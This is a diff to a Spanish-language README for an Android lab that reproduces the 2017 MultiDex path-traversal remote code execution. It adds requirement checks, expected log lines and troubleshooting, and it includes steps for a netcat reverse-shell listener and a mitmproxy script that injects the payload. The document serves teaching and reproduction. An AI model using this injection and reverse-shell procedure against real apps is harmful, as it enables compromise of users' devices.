@@ -7,7 +7,8 @@ Esta vulnerabilidad fue descubierta por **NowSecure en 2017** y afecta aplicacio
 1. **Path Traversal**: Archivos ZIP maliciosos que pueden escribir archivos fuera del directorio esperado usando `../../../../`
 2. **MultiDex Auto-loading**: MultiDex 1.0.1 carga automáticamente archivos DEX desde el directorio `secondary-dexes`
 
-**Referencia original**: [NowSecure Blog - Android Multidex RCE](https://www.nowsecure.com/blog/2017/03/22/multidex-android-apps-remote-code-execution/)
+**Referencia original
+**: [NowSecure Blog - Android Multidex RCE](https://www.nowsecure.com/blog/2017/06/15/a-pattern-for-remote-code-execution-using-arbitrary-file-writes-and-multidex-applications/)
 
 ## ¿Cómo funciona el ataque?
 
@@ -72,10 +73,29 @@ Ambos enfoques demuestran el mismo concepto de seguridad:
 
 ## Requisitos
 
-- Android SDK instalado
-- Emulador Android (API 21+)
-- Python 3 con mitmproxy: `pip install mitmproxy`
-- ADB configurado
+### **Software Necesario:**
+
+- **Android SDK** con API Level 22+ instalado
+- **Android Emulator** (API 21+) o dispositivo físico
+- **ADB** configurado y funcionando
+- **Python 3** con mitmproxy: `pip install mitmproxy`
+- **Java JDK 8+** para compilar payload
+
+### **Verificación de Requisitos:**
+
+```bash
+# Verificar ADB
+adb version
+
+# Verificar dispositivo conectado
+adb devices
+
+# Verificar Python y mitmproxy  
+python3 -c "import mitmproxy; print('OK')"
+
+# Verificar Android SDK
+echo $ANDROID_HOME
+```
 
 ## Pasos para replicar
 
@@ -117,7 +137,7 @@ nc -l 4444 &
 adb shell am start -n com.app.lab.rce/.MainActivity
 
 # Monitorear logs del exploit
-adb logcat | grep -E "(RCE|AdUpdateService)"
+adb logcat | grep -E "(RCE|AdUpdateService|NOWSECURE)"
 ```
 
 ## ¿Cómo saber si funcionó?
@@ -139,15 +159,18 @@ lsof -i :4444
 ### Logs esperados:
 
 ```
+NOWSECURE 2017: Malicious DEX planted for next restart
+SIMULATION: Triggering app restart...
+NOWSECURE 2017: Payload auto-loaded by MultiDex
 RCE: Static initializer executed
 RCE: Evidence file created successfully
 RCE: Constructor executed - launching reverse shell
-AdUpdateService: RCE executed
+NOWSECURE 2017: RCE executed on app startup
 ```
 
 ## Componentes del exploit
 
-- **`AdUpdateService.kt`**: Descarga ZIPs cada 15 segundos y extrae con path traversal
+- **`AdUpdateService.kt`**: Descarga ZIPs cada 10 segundos y simula path traversal
 - **`RCEApplication.kt`**: Configuración MultiDex vulnerable
 - **`Shell.java`**: Payload que crea archivo de evidencia y reverse shell
 - **`inject_payload.py`**: Proxy que intercepta y reemplaza descargas
@@ -157,9 +180,10 @@ AdUpdateService: RCE executed
 
 Una vez iniciada, la aplicación:
 
-- Descarga archivos cada 15 segundos automáticamente
+- Descarga archivos cada 10 segundos automáticamente
 - El proxy intercepta y sirve el payload malicioso
 - El exploit se ejecuta automáticamente sin intervención del usuario
+- El exploit se ejecuta en el siguiente restart (patrón NowSecure 2017)
 - Cada ejecución crea nuevas conexiones de reverse shell
 
 ## Limpieza
@@ -170,9 +194,41 @@ Para resetear y probar desde cero:
 # Limpiar datos de la app
 adb shell pm clear com.app.lab.rce
 
-# Detener procesos
+# Remover configuración de proxy
+adb shell settings delete global http_proxy
+
+# Detener procesos background
 pkill -f mitmdump && pkill -f nc
 ```
+
+## Troubleshooting
+
+### Problemas Comunes:
+
+**1. Error: "Android SDK not found"**
+
+```bash
+export ANDROID_HOME=/path/to/your/android/sdk
+```
+
+**2. Error: "No device connected"**
+
+```bash
+# Iniciar emulador
+emulator -avd YOUR_AVD_NAME
+```
+
+**3. Error: "mitmproxy not found"**
+
+```bash
+pip install mitmproxy
+```
+
+**4. El exploit no se ejecuta:**
+
+- Verificar que el proxy esté interceptando: `mitmdump -s mitmproxy/inject_payload.py -p 8090`
+- Verificar logs: `adb logcat | grep NOWSECURE`
+- Limpiar datos de la app: `adb shell pm clear com.app.lab.rce`
 
 ---
 
